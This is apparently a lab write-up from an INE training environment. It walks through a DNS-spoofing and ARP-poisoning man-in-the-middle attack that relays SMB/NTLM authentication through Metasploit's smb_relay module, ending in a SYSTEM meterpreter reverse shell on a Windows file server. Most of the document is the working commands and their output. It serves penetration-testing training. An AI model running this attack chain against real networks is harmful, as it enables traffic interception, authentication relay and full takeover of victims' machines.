## DNS & SMB Relay Attack

### Target
`demo.ine.local`

### Tools:
* `dnsspoof`
* `msf`

### Objective: Exploitation using SMB Relay Attack
We first sdet up a relay to listen to incoming connection
```bash
msf6 exploit(windows/smb/smb_relay) > set srvhost 172.16.5.101
srvhost => 172.16.5.101
msf6 exploit(windows/smb/smb_relay) > set LHOST 172.16.5.101
LHOST => 172.16.5.101
msf6 exploit(windows/smb/smb_relay) > set smbhost 172.16.5.101
smbhost => 172.16.5.101
msf6 exploit(windows/smb/smb_relay) > set smbhost 172.16.5.10
smbhost => 172.16.5.10
msf6 exploit(windows/smb/smb_relay) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.5.101:4444 
[*] Started service listener on 172.16.5.101:445 
msf6 exploit(windows/smb/smb_relay) > [*] Server started.
```
Once we are done we set up dnsspoofing to fake the ip address of the target
```bash
┌──(rootkali)-[~]
└─# echo "172.16.5.101 *.sportsfoo.com" > dns                                                 
┌──(rootkali)-[~]
└─# dnsspoof -i eth1 -f dns                  
dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]
```
Next we poison the cache via arp spoofing to ensure that anytime the victim tries to connect to the server it redirects to our host.
```bash
┌──(rootkali)-[~]
└─# echo 1 > /proc/sys/net/ipv4/ip_forward        
                                                                                                                                                       
┌──(rootkali)-[~]
└─# arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d
```
```bash
┌──(rootkali)-[~]
└─# arpspoof -i eth1 -t 172.16.5.1 172.16.5.5        
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
```
Once we are done we just wait for the connection in msf
```bash
Desktop  dns  Documents  Downloads  Music  Pictures  Public  Templates  thinclient_drives  Videos
msf6 exploit(windows/smb/smb_relay) > sessions

Active sessions
===============

  Id  Name  Type                     Information                       Connection
  --  ----  ----                     -----------                       ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ FILESERVER  172.16.5.101:4444 -> 172.16.5.10:49158 (172.16.5.10)

msf6 exploit(windows/smb/smb_relay) > 
```
Once we have the connection we just use a meterpreter session and get the required credentials.
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sys
[*] Sending NTLMSSP NEGOTIATE to 172.16.5.10
[*] Extracting NTLMSSP CHALLENGE from 172.16.5.10
[*] Forwarding the NTLMSSP CHALLENGE to 172.16.5.5:49168
[*] Extracting the NTLMSSP AUTH resolution from 172.16.5.5:49168, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 172.16.5.10
[+] SMB auth relay against 172.16.5.10 succeeded
[*] Ignoring request from 172.16.5.10, attack already in progress.
info
Computer        : FILESERVER
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > 
```
